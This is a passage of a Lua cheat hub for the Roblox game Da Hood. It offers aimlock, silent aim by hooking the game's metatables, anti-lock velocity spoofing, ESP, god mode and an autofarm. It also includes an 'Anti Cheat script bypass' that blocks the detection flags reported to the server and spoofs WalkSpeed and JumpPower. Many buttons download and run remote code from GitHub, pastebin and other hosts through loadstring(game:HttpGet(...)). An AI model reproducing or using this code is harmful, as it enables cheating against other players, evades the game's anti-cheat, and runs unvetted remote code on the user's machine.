                 end	
             end	
         else	
             Notify("Aimlock is not enabled!")	
         end	
     end	
     if k == SelectedDisableKey then	
         AimlockState = not AimlockState	
     end	
 end)	
     
 --// Loop update FOV and loop camera lock onto target	
     
 RS.RenderStepped:Connect(function()	
     update()	
     if AimlockState == true then	
         if Victim ~= nil then	
             Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)	
         end	
     end	
 end)	
     while wait() do
         if getgenv().AutoPrediction == true then	
         local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()	
         local split = string.split(pingvalue,'(')	
 local ping = tonumber(split[1])	
 if ping < 225 then	
 getgenv().Prediction = 1.4	
 elseif ping < 215 then	
 getgenv().Prediction = 1.2	
     elseif ping < 205 then
 getgenv().Prediction = 1.0	
     elseif ping < 190 then
 getgenv().Prediction = 0.10	
 elseif ping < 180 then	
 getgenv().Prediction = 0.12	
     elseif ping < 170 then
 getgenv().Prediction = 0.15	
     elseif ping < 160 then
 getgenv().Prediction = 0.18	
     elseif ping < 150 then
 getgenv().Prediction = 0.110	
 elseif ping < 140 then	
 getgenv().Prediction = 0.113	
 elseif ping < 130 then	
 getgenv().Prediction = 0.116	
 elseif ping < 120 then	
 getgenv().Prediction = 0.120	
 elseif ping < 110 then	
 getgenv().Prediction = 0.124	
 elseif ping < 105 then	
 getgenv().Prediction = 0.127	
 elseif ping < 90 then	
 getgenv().Prediction = 0.130	
 elseif ping < 80 then	
 getgenv().Prediction = 0.133	
 elseif ping < 70 then	
 getgenv().Prediction = 0.136	
 elseif ping < 60 then	
 getgenv().Prediction = 0.140	
 elseif ping < 50 then	
 getgenv().Prediction = 0.143	
 elseif ping < 40 then	
 getgenv().Prediction = 0.145	
 elseif ping < 30 then	
 getgenv().Prediction = 0.155	
 elseif ping < 20 then	
 getgenv().Prediction = 0.157	
         end	
         end	
     end 
 end)
 
 -- Silent Aim Section
local LockSection = Lock:NewSection("Silent Aim section or streamable")

LockSection:NewButton("Silent Aim", "No Toggle", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/Standalones/SilentAim", true))()
end)

LockSection:NewButton("T StreamAble Big Chance To hit", "T Toggle and Untoggle", function()
    local hotkey = "t" -- toggle key
local mouse = game.Players.LocalPlayer:GetMouse()



mouse.KeyDown:Connect(function(key)
if key == hotkey then
if getgenv().ValiantAimHacks.SilentAimEnabled == true then
 getgenv().ValiantAimHacks.SilentAimEnabled = false
else
getgenv().ValiantAimHacks.SilentAimEnabled = true
end
end
end)


-- // Services
local Players = game:GetService("Players")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local accomidationfactor = 0.12567724521

-- // Silent Aim Module
local SilentAim = loadstring(game:HttpGet("https://pastebin.com/raw/2f0mGbMP"))()
SilentAim.TeamCheck = false
-- // Metatable vars
local mt = getrawmetatable(game)
local backupindex = mt.__index
setreadonly(mt, false)

-- // Check if player is down
SilentAim.checkSilentAim = function()
    local checkA = (SilentAim.SilentAimEnabled == true and SilentAim.Selected ~= LocalPlayer)
    local playerCharacter = SilentAim.Selected.Character
    local daHood = (playerCharacter.BodyEffects["K.O"].Value == false or playerCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil)

    return (checkA and daHood)
end

-- // Hook
mt.__index = newcclosure(function(t, k)
    if (t:IsA("Mouse") and (k == "Hit")) then
        print(t, k)
        local CPlayer = SilentAim.Selected
        if (SilentAim.checkSilentAim()) then
            if (CPlayer.Character:FindFirstChild("HumanoidRootPart")) then
                return {p=(CPlayer.Character.HumanoidRootPart.CFrame.p+(CPlayer.Character.HumanoidRootPart.Velocity*accomidationfactor))}
            end
        end
    end
    return backupindex(t, k)
end)

-- // Revert
setreadonly(mt, true)
getgenv().ValiantAimHacks.FOV = 50
end)

LockSection:NewButton("Streamable script Must join Group", "The Bodypart your cursor is closes hits", function()
    -- 0.138
    -- 0.11243
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jjchino21/doesntmatter23/main/2323232"))()
    DaHoodSettings.Prediction = 0.138
    Aiming.TargetPart = {"Head", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg", "UpperTorso", "HumanoidRootPart", "LeftUpperLeg", "RightLowerLeg", "RightFoot", "LowerTorso"}
    Aiming.FOV = 18
    Aiming.FOVSides = 18
    Aiming.HitChance = 400
    Aiming.ShowFOV = true
end)

LockSection:NewButton("Fov Silent Aim Must Join group", "The Bodypart your cursor is closes hits", function()
-- 0.138
-- 0.11243
loadstring(game:HttpGet("https://raw.githubusercontent.com/jjchino21/doesntmatter323232/main/sui"))()
DaHoodSettings.Prediction = 0.138
Aiming.TargetPart = {"Head", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg", "UpperTorso", "HumanoidRootPart", "LeftUpperLeg", "RightLowerLeg", "RightFoot", "LowerTorso"}
Aiming.FOV = 20
Aiming.FOVSides = 20
Aiming.HitChance = 400
Aiming.ShowFOV = true
end)

 LockSection:NewButton(" Q Cool Trace Silent", "Q to toggle", function()
     _G.TargetAim = {
         ["Key"] = "q",
         ["Mode"] = "Toggle", -- "Toggle" or "Hold"
         ["Prediction"] = 0.12118, -- Lower if Lower Ping, Higher if Higher Ping
         ["Auto-Prediction"] = true,
         ["Aimpart"] = "HumanoidRootPart",
         ["Face-Target"] = false,
         ["Notif-Toggle"] = true,
         ["Chat-Toggle"] = false,
         ["View-Toggle"] = false,
         ["Resolver-V1"] = false,
         ["Resolver-Delay"] = 0.195,
         ["Resolver-Aimpart"] = "HumanoidRootPart",
         ["Resolver-AntiSky"] = true,
         ["Resolver-AntiGround"] = true,
         ["Resolver-Reverse"] = false,
         ["Orbit-Toggle"] = false,
         ["Orbit-Speed"] = 8,
         ["Orbit-Size"] = 8,
         ["Orbit-Height"] = 0, -- No Negatives
         ["Vertical-Velocity-Toggle"] = false,
         ["Vertical-Velocity"] = 0,
         ["Horizontal-Velocity-Toggle"] = false,
         ["Horizontal-Velocity"] = 0,
         ["Onshot-Visual"] = true,
         ["Onshot-Visual-Color"] = Color3.fromRGB(119,0,255),
         ["Onshot-Visual-Material"] = "Neon", -- "Plastic", "ForceField", "Neon"
         ["Onshot-Visual-Life"] = 10, -- Seconds
         ["Onshot-Sound"] = true,
         ["Onshot-Sound-Sounda"] = 12413331,
         ["Check-For-Part"] = "HumanoidRootPart",
         ["FOV-Check"] = false,
         ["FOV-Check-Color"] = Color3.fromRGB(119,0,255),
         ["FOV-Size"] = 100,
         ["Circle-Thickness"] = 2, 
         ["Filled-Circle"] = false,
         ["Circle-Transparency"] = 1, --Invisible
         ["Visible-Check"] = false,
         ["Down-Check"] = true, -- For Hood Customs and Untitled Hood
         ["Dot"] = true,
         ["Dot-Color"] = Color3.fromRGB(119,0,255),
         ["Tracer"] = true,
         ["Tracer-Color"] = Color3.fromRGB(119,0,255),
         ["Highlight"] = true,
         ["Highlight-Color"] = Color3.fromRGB(119,0,255),
     }
     loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/Standalones/SilentAim", true))()
 end)
 
 LockSection:NewButton("Q Silent Box", "Ping Based LowerTorse", function()
 -- Toggle key is Q
 getgenv().Target = true
 -- Configuration
 getgenv().Key = Enum.KeyCode.Q
 getgenv().Prediction = 0.130340
 getgenv().ChatMode = false
 getgenv().NotifMode = true
     getgenv().PartMode = true
     getgenv().AirshotFunccc = true
     getgenv().Partz = "LowerTorso"
 getgenv().AutoPrediction = false
 --
     _G.Types = {
         Ball = Enum.PartType.Ball,
         Block = Enum.PartType.Block, 
         Cylinder = Enum.PartType.Cylinder
     }
     
     --variables                 
         local Tracer = Instance.new("Part", game.Workspace)
     Tracer.Name = "gay" 
     Tracer.Anchored = true      
     Tracer.CanCollide = false
     Tracer.Transparency = 0.8
     Tracer.Parent = game.Workspace  
     Tracer.Shape = _G.Types.Block
     Tracer.Size = Vector3.new(14,14,14)
     Tracer.Color = Color3.fromRGB(16,0,22)
     
     --
     local plr = game.Players.LocalPlayer
 local mouse = plr:GetMouse()
 local Runserv = game:GetService("RunService")
 
 circle = Drawing.new("Circle")
 circle.Color = Color3.fromRGB(255,255,255)
 circle.Thickness = 0
 circle.NumSides = 732
 circle.Radius = 732
 circle.Thickness = 0
 circle.Transparency = 0.9
 circle.Visible = false
 circle.Filled = false
 
 
 Runserv.RenderStepped:Connect(function()
     circle.Position = Vector2.new(mouse.X,mouse.Y+35)
 end)
     
         local guimain = Instance.new("Folder", game.CoreGui)
         local CC = game:GetService"Workspace".CurrentCamera
     local LocalMouse = game.Players.LocalPlayer:GetMouse()
         local Locking = false
     
         
     --
     if getgenv().valiansh == true then
                         game.StarterGui:SetCore("SendNotification", {
                         Title    = "JJ-CLOWN",
                         Text     = "loaded",
                         Duration = 1
         
                    })
         return
     end
     
     getgenv().valiansh = true
     
         local UserInputService = game:GetService("UserInputService")
 
     UserInputService.InputBegan:Connect(function(keygo,ok)
            if (not ok) then
            if (keygo.KeyCode == getgenv().Key) then
                if getgenv().Target == true then
                Locking = not Locking
                
                if Locking then
                Plr =  getClosestPlayerToCursor()
                 if getgenv().ChatMode then
         local A_1 = "Target: "..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
             end 
                if getgenv().NotifMode then
                 game.StarterGui:SetCore("SendNotification", {
         Title = "JJ-CLOWN";
         Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName);
     
     })
     end
     elseif not Locking then
          if getgenv().ChatMode then
         local A_1 = "Unlocked!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
             end 
         if getgenv().NotifMode then
                         game.StarterGui:SetCore("SendNotification", {
                         Title    = "JJ-CLOWN",
                         Text     = "unlocked",
                         Duration = 1
                })
            elseif getgenv().Target == false then
                         game.StarterGui:SetCore("SendNotification", {
                         Title    = " lock",
                         Text     = "target isn't enabled",
                         Duration = 1
      
                    })
                
                end
                   
  
  end     end   
 end
 end
 end)
     
     function getClosestPlayerToCursor()
         local closestPlayer
         local shortestDistance = circle.Radius
 
         for i, v in pairs(game.Players:GetPlayers()) do
             if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
                 local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                 local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                 if magnitude < shortestDistance then
                     closestPlayer = v
                     shortestDistance = magnitude
                 end
             end
         end
         return closestPlayer
     end
 --
 if getgenv().PartMode then
     game:GetService"RunService".Stepped:connect(function()
         if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
             Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
         else
             Tracer.CFrame = CFrame.new(0, 9999, 0)
 
         end
     end)
 end
 
     
     
     --
     local rawmetatable = getrawmetatable(game)
     local old = rawmetatable.__namecall
     setreadonly(rawmetatable, false)
     rawmetatable.__namecall = newcclosure(function(...)
         local args = {...}
         if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
             args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
             return old(unpack(args))
         end
         return old(...)
     end)
 
 
 if getgenv().AirshotFunccc == true then
 
             if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                 getgenv().Partz = "RightFoot"
             else
                 Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                     if new == Enum.HumanoidStateType.Freefall then
                     getgenv().Partz = "RightFoot"
                     else
                         getgenv().Partz = "LowerTorso"
                     end
                 end)
             end
 end
 ---
     while wait() do
     if getgenv().AutoPrediction == true then
         local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
         local split = string.split(pingvalue,'(')
         local ping = tonumber(split[1])
         if ping < 130 then
             getgenv().Prediction = 0.151
         elseif ping < 125 then
             getgenv().Prediction = 0.149
         elseif ping < 110 then
             getgenv().Prediction = 0.146
         elseif ping < 105 then
             getgenv().Prediction = 0.138
         elseif ping < 90 then
             getgenv().Prediction = 0.136
         elseif ping < 80 then
             getgenv().Prediction = 0.134
         elseif ping < 70 then
             getgenv().Prediction = 0.131
         elseif ping < 60 then
             getgenv().Prediction = 0.1229
         elseif ping < 50 then
             getgenv().Prediction = 0.1225
         elseif ping < 40 then
             getgenv().Prediction = 0.1256
         end
     end
     end
 end)
 
 
 -- AntiLock
 local AntiLock = Window:NewTab("AntiLock")
 local AntiLockSection = AntiLock:NewSection("AntiLock")
 
 AntiLockSection:NewButton("VinGui + Antilock C", "Antilock C to toggle and untoggle", function()
     --KEY IS C
     
     getgenv().tog = false
     getgenv().key = "c"
     getgenv().X = 68756
     getgenv().Y = 100
     getgenv().Z = -344
     
     game:GetService("RunService").Heartbeat:Connect(function()
             if getgenv().tog then
                     local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(getgenv().X, getgenv().Y, getgenv().Z)
                     game:GetService("RunService").RenderStepped:Wait()
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
             end
     end)
     
     game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(keyPressed)
             if keyPressed == string.lower(getgenv().key) then
                     pcall(function()
                             if getgenv().tog == false then
                                     getgenv().tog = true
                                     game.StarterGui:SetCore("SendNotification", {
                                             Title = "jj-clown",
                                             Text = "antilock enabled" })
                             elseif getgenv().tog == true then
                                     getgenv().tog = false
                                     game.StarterGui:SetCore("SendNotification", {
                                             Title = "jj-clown",
                                             Text = "antilock disabled" })
                             end
                     end)
             end
     end)
     hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
      
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/VinGUI"))()
     end)
 
 
 AntiLockSection:NewButton("Aim viewer", "View Aim", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Aim%20Viewer"))()
 end)
 
 AntiLockSection:NewButton("Anti lock 1", "No toggle", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/chrsschrs/antilocks/main/aa"))()
 end)
 
 
 AntiLockSection:NewButton("Anti lock 2", "No toggle", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/chrsschrs/antilock/main/chrss"))()
 end)
 
 
 AntiLockSection:NewButton("Anti Lock N", "N to toggle and untoggle (UnderGround)", function()
     getgenv().Mode = "Underground" --// Modes: Underground, Sky, Prediction Changer
 getgenv().KeyBind = "n" --// Key to press to enable
 getgenv().PredictionAmount = "2" --// Number to change prediction to
  
 loadstring(game:HttpGet('https://fourdevils.gq/anti-aim-hub.lua'))()
 end)
 
 AntiLockSection:NewButton(" Z Toggle Antilock", "Z To Toggle", function()
     local Toggled = false
 local KeyCode = 'z'
 
 
 function AA()
     local oldVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
     game.Players.LocalPlayer.Character.Humanoid.HipHeight = 4.14
 end
 
 game:GetService('UserInputService').InputBegan:Connect(function(Key)
     if Key.KeyCode == Enum.KeyCode[KeyCode:upper()] and not game:GetService('UserInputService'):GetFocusedTextBox() then
         if Toggled then
             Toggled = false
             game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1.85
 
         elseif not Toggled then
             Toggled = true
 
             while Toggled do
                 AA()
                 task.wait()
             end
         end
     end
 end)
 end)
 
 -- Dh scripts
 local dhscripts = Window:NewTab("DH scripts")
 local dhscriptsSection = dhscripts:NewSection("da hood scripts")
 
 dhscriptsSection:NewButton("Anti Cheat script bypass", "Yes?", function()
 -- // Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- // Vars
 local tablefind = table.find
 local MainEvent = ReplicatedStorage.MainEvent
 local SpoofTable = {
     WalkSpeed = 16,
     JumpPower = 50
 }
 
 -- // Configuration
 local Flags = {
     "CHECKER_1",
     "TeleportDetect",
     "OneMoreTime"
 }
 
 -- // __namecall hook
 local __namecall
 __namecall = hookmetamethod(game, "__namecall", function(...)
     -- // Vars
     local args = {...}
     local self = args[1]
     local method = getnamecallmethod()
     local caller = getcallingscript()
 
     -- // See if the game is trying to alert the server
     if (method == "FireServer" and self == MainEvent and tablefind(Flags, args[2])) then
         return
     end
 
     -- // Anti Crash
     if (not checkcaller() and getfenv(2).crash) then
         -- // Hook the crash function to make it not work
         hookfunction(getfenv(2).crash, function()
             warn("Crash Attempt") 
         end)
     end
     
     -- //
     return __namecall(...)
 end)
 
 -- // __index hook
 local __index
 __index = hookmetamethod(game, "__index", function(t, k)
     -- // Make sure it's trying to get our humanoid's ws/jp
     if (not checkcaller() and t:IsA("Humanoid") and (k == "WalkSpeed" or k == "JumpPower")) then
         -- // Return spoof values
         return SpoofTable[k]
     end
 
     -- //
     return __index(t, k)
 end)
 
 -- // __newindex hook
 local __newindex
 __newindex = hookmetamethod(game, "__newindex", function(t, k, v)
     -- // Make sure it's trying to set our humanoid's ws/jp
     if (not checkcaller() and t:IsA("Humanoid") and (k == "WalkSpeed" or k == "JumpPower")) then
         -- // Add values to spoof table
         SpoofTable[k] = v
 
         -- // Disallow the set
         return
     end
     
     -- //
     return __newindex(t, k, v)
 end)
 end)
 
 dhscriptsSection:NewButton("Police Auto farm", "Police only", function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/CorruptOblivion/DaHood/main/dahoodarrestfarm.lua'))()
 end)
 
 dhscriptsSection:NewButton("Esp 200 feet away", "Esp highlight", function()
 local Players = game:GetService("Players"):GetChildren()
 local RunService = game:GetService("RunService")
 local highlight = Instance.new("Highlight")
 highlight.Name = "Highlight"
 
 for i, v in pairs(Players) do
     repeat wait() until v.Character
     if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
         local highlightClone = highlight:Clone()
         highlightClone.Adornee = v.Character
         highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
         highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
         highlightClone.Name = "Highlight"
     end
 end
 
 game.Players.PlayerAdded:Connect(function(player)
     repeat wait() until player.Character
     if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
         local highlightClone = highlight:Clone()
         highlightClone.Adornee = player.Character
         highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
         highlightClone.Name = "Highlight"
     end
 end)
 
 game.Players.PlayerRemoving:Connect(function(playerRemoved)
     playerRemoved.Character:FindFirstChild("HumanoidRootPart").Highlight:Destroy()
 end)
 
 RunService.Heartbeat:Connect(function()
     for i, v in pairs(Players) do
         repeat wait() until v.Character
         if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
             local highlightClone = highlight:Clone()
             highlightClone.Adornee = v.Character
             highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
             highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
             highlightClone.Name = "Highlight"
             task.wait()
         end
 end
 end)
end)

 dhscriptsSection:NewButton("Esp everyone", "Esp", function()
 --[Main Variables]
 
 local plrs = game["Players"]
 local rs = game["RunService"]
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local Lighting = game:GetService("Lighting")
 local Teams = game:GetService("Teams")
 local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 
 
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = workspace.CurrentCamera
 local plr = plrs.LocalPlayer
 local mouse = plr:GetMouse()
 local camera = workspace.CurrentCamera
 local worldToViewportPoint = camera.worldToViewportPoint
 local cc = Instance.new("ColorCorrectionEffect", game.Lighting)
 local blur = Instance.new("BlurEffect", game.Lighting)
 local sun = Instance.new("SunRaysEffect", game.Lighting)
 blur.Size = 0
 sun.Intensity = 0
 
 --[Optimisation Variables]
 
 local Drawingnew = Drawing.new
 local Color3fromRGB = Color3.fromRGB
 local Vector3new = Vector3.new
 local Vector2new = Vector2.new
 local mathfloor = math.floor
 local mathceil = math.ceil
 
 --[Setup Table]
 
 local esp = {
     players = {},
     enabled = true,
     teamcheck = true,
     fontsize = 16,
     font = 0,
     settings = {
         name = {enabled = true, outline = true, color = Color3fromRGB(255, 255, 255), outlineColor = Color3fromRGB(94, 0, 255)},
         box = {enabled = true, outline = true, color = Color3fromRGB(131, 105, 165), outlineColor = Color3fromRGB(0, 0, 0)},
         healthbar = {enabled = true, outline = true, color = Color3fromRGB(111, 0, 255), outlineColor = Color3fromRGB(0, 0, 0)},
         healthtext = {enabled = true, outline = true, color = Color3fromRGB(255, 255, 255), outlineColor = Color3fromRGB(94, 0, 255)},
         distance = {enabled = true, outline = true, color = Color3fromRGB(255, 255, 255), outlineColor = Color3fromRGB(94, 0, 255)}
     }
 }
 
 esp.NewDrawing = function(type, properties)
     local newDrawing = Drawingnew(type)
 
     for i,v in next, properties or {} do
         newDrawing[i] = v
     end
 
     return newDrawing
 end
 
 esp.NewPlayer = function(v)
     esp.players[v] = {
         name = esp.NewDrawing("Text", {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0}),
         boxOutline = esp.NewDrawing("Square", {Color = Color3fromRGB(0, 0, 0), Thickness = 3}),
         box = esp.NewDrawing("Square", {Color = Color3fromRGB(108, 11, 204), Thickness = 1}),
         healthBarOutline = esp.NewDrawing("Line", {Color = Color3fromRGB(0, 0, 0), Thickness = 3}),
         healthBar = esp.NewDrawing("Line", {Color = Color3fromRGB(255, 255, 255), Thickness = 1}),
         healthText = esp.NewDrawing("Text", {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0}),
         distance = esp.NewDrawing("Text", {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0})
     }
 end
 
 for _,v in ipairs(plrs:GetPlayers()) do
     esp.NewPlayer(v)
 end
 
 plrs.PlayerAdded:Connect(function(v)
     esp.NewPlayer(v)
 end)
 
 plrs.PlayerRemoving:Connect(function(v)
     for i,v in pairs(esp.players[v]) do
         v:Remove()
     end
     esp.players[v] = nil
 end)
 
 local mainLoop = rs.RenderStepped:Connect(function()
     for i,v in pairs(esp.players) do
         if i ~= plr and i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("HumanoidRootPart") and i.Character:FindFirstChild("Head") then
             local hum = i.Character.Humanoid
             local hrp = i.Character.HumanoidRootPart
             local head = i.Character.Head
 
             local Vector, onScreen = camera:WorldToViewportPoint(i.Character.HumanoidRootPart.Position)
     
             local Size = (camera:WorldToViewportPoint(hrp.Position - Vector3new(0, 3, 0)).Y - camera:WorldToViewportPoint(hrp.Position + Vector3new(0, 2.6, 0)).Y) / 2
             local BoxSize = Vector2new(mathfloor(Size * 1.5), mathfloor(Size * 1.9))
             local BoxPos = Vector2new(mathfloor(Vector.X - Size * 1.5 / 2), mathfloor(Vector.Y - Size * 1.6 / 2))
     
             local BottomOffset = BoxSize.Y + BoxPos.Y + 1
 
             if onScreen and esp.enabled then
                 if esp.settings.name.enabled then
                     v.name.Position = Vector2new(BoxSize.X / 2 + BoxPos.X, BoxPos.Y - 16)
                     v.name.Outline = esp.settings.name.outline
                     v.name.Text = tostring(i)
                     v.name.Color = esp.settings.name.color
                     v.name.OutlineColor = esp.settings.name.outlineColor
                     v.name.Font = esp.font
                     v.name.Size = esp.fontsize
 
                     v.name.Visible = true
                 else
                     v.name.Visible = false
                 end
 
                 if esp.settings.distance.enabled and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                     v.distance.Position = Vector2new(BoxSize.X / 2 + BoxPos.X, BottomOffset)
                     v.distance.Outline = esp.settings.distance.outline
                     v.distance.Text = "[" .. mathfloor((hrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude) .. "m]"
                     v.distance.Color = esp.settings.distance.color
                     v.distance.OutlineColor = esp.settings.distance.outlineColor
                     BottomOffset = BottomOffset + 15
 
                     v.distance.Font = esp.font
                     v.distance.Size = esp.fontsize
 
                     v.distance.Visible = true
                 else
                     v.distance.Visible = false
                 end
 
                 if esp.settings.box.enabled then
                     v.boxOutline.Size = BoxSize
                     v.boxOutline.Position = BoxPos
                     v.boxOutline.Visible = esp.settings.box.outline
                     v.boxOutline.Color = esp.settings.box.outlineColor
     
                     v.box.Size = BoxSize
                     v.box.Position = BoxPos
                     v.box.Color = esp.settings.box.color
                     v.box.Visible = true
                 else
                     v.boxOutline.Visible = false
                     v.box.Visible = false
                 end
 
                 if esp.settings.healthbar.enabled then
                     v.healthBar.From = Vector2new((BoxPos.X - 5), BoxPos.Y + BoxSize.Y)
                     v.healthBar.To = Vector2new(v.healthBar.From.X, v.healthBar.From.Y - (hum.Health / hum.MaxHealth) * BoxSize.Y)
                     v.healthBar.Color = esp.settings.healthbar.color
                     v.healthBar.Visible = true
 
                     v.healthBarOutline.From = Vector2new(v.healthBar.From.X, BoxPos.Y + BoxSize.Y + 1)
                     v.healthBarOutline.To = Vector2new(v.healthBar.From.X, (v.healthBar.From.Y - 1 * BoxSize.Y) -1)
                     v.healthBarOutline.Color = esp.settings.healthbar.outlineColor
                     v.healthBarOutline.Visible = esp.settings.healthbar.outline
                 else
                     v.healthBarOutline.Visible = false
                     v.healthBar.Visible = false
                 end
 
                 if esp.settings.healthtext.enabled then
                     v.healthText.Text = tostring(mathfloor((hum.Health / hum.MaxHealth) * 100 + 0.5))
                     v.healthText.Position = Vector2new((BoxPos.X - 20), (BoxPos.Y + BoxSize.Y - 1 * BoxSize.Y) -1)
                     v.healthText.Color = esp.settings.healthtext.color
                     v.healthText.OutlineColor = esp.settings.healthtext.outlineColor
                     v.healthText.Outline = esp.settings.healthtext.outline
 
                     v.healthText.Font = esp.font
                     v.healthText.Size = esp.fontsize
 
                     v.healthText.Visible = true
                 else
                     v.healthText.Visible = false
                 end
 
                 if esp.teamcheck then
                     if v.TeamColor ~= plr.TeamColor then
                         v.name.Visible = esp.settings.name.enabled
                         v.box.Visible = esp.settings.box.enabled
                         v.healthBar.Visible = esp.settings.healthbar.enabled
                         v.healthText.Visible = esp.settings.healthtext.enabled
                         v.distance.Visible = esp.settings.distance.enabled
                     else
                         v.name.Visible = false
                         v.boxOutline.Visible = false
                         v.box.Visible = false
                         v.healthBarOutline.Visible = false
                         v.healthBar.Visible = false
                         v.healthText.Visible = false
                         v.distance.Visible = false
                     end
                 end
             else
                 v.name.Visible = false
                 v.boxOutline.Visible = false
                 v.box.Visible = false
                 v.healthBarOutline.Visible = false
                 v.healthBar.Visible = false
                 v.healthText.Visible = false
                 v.distance.Visible = false
             end
         else
             v.name.Visible = false
             v.boxOutline.Visible = false
             v.box.Visible = false
             v.healthBarOutline.Visible = false
             v.healthBar.Visible = false
             v.healthText.Visible = false
             v.distance.Visible = false
         end
     end
 end)
 
 getgenv().esp = esp
 end)
 
 dhscriptsSection:NewButton("GodBullet", "GodBullet", function()
 local localPlayer = game:GetService('Players').LocalPlayer;
     local localCharacter = localPlayer.Character;
     localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
     for _,v in pairs(localPlayer.Character:GetChildren()) do
         if v:IsA('MeshPart') or v:IsA('Accessory') then
             v:Destroy();
         end;
     end;
     local newCharacter = localPlayer.CharacterAdded:Wait();
     local spoofFolder = Instance.new('Folder');
     spoofFolder.Name = 'FULLY_LOADED_CHAR';
     spoofFolder.Parent = newCharacter;
     newCharacter:WaitForChild('RagdollConstraints'):Destroy();
     newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
     local spoofValue = Instance.new('BoolValue', newCharacter);
     spoofValue.Name = 'RagdollConstraints';
     local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
     armValue.Name = 'Armor';
     
 end)
 
 dhscriptsSection:NewButton("GodMode, GodBlock, AutoBlock, Hide Block, Anti slow, Anti Effect", "Hide Block, Anti slow, Anti Effect", function()
 getgenv().Settings = {
     ['Custom'] = {
         ["GodV2"] = true,
         ["GodV3"] = true,
         ["Godblock"] = true,
         ["Autoblock"] = true,
         ["Hideblock"] = true,
         ["Antislow"] = true,
         ["Antieffect"] = true,
     }
 }
 
 if not game['Loaded'] or not game:GetService("Players").LocalPlayer then 
     game['Loaded']:Wait();
     game:WaitForChild(game:GetService('Players'));
     game:GetService('Players'):WaitForChild(game:GetService("Players").LocalPlayer.Name)
 end
 
 assert(getrawmetatable)
 gmt = getrawmetatable(game)
 setreadonly(gmt, false)
 old = gmt.__namecall
 gmt.__namecall =
 newcclosure(
 function(self, ...)
     local args = {...}
         if tostring(self) == "RemoteFunction" then return end
         if tostring(self) == "MainEvent" then
